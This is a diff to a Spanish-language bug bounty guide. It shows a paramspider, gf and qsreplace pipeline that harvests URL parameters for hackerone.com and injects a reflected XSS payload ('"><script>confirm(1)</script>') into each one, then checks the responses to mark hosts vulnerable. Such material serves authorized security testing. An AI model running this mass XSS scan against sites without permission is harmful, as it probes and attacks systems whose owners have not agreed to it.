@@ -119,6 +119,12 @@ paramspider -d hackerone.com --placeholder FUZZ
 paramspider -d hackerone.com
 cat results/hackerone.com.txt | tee yy.json | qsreplace '"><script>confirm(1)</script>' | while read host do; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n"; done
 ```
+Estos resultados los obtuvimos con la herramienta Paramspider, la cual le coloca FUZZ a los parametros.\
+Aqui procedemos a usar los diferentes parametros y crear archivos diferentes
+
+```ruby
+cat results/hackerone.com.txt | gf xss | tee xss_output.txt
+```
 
 ### Una vez encontrada algunos links procedemos a inyectar payloads con la herramienta gf
 
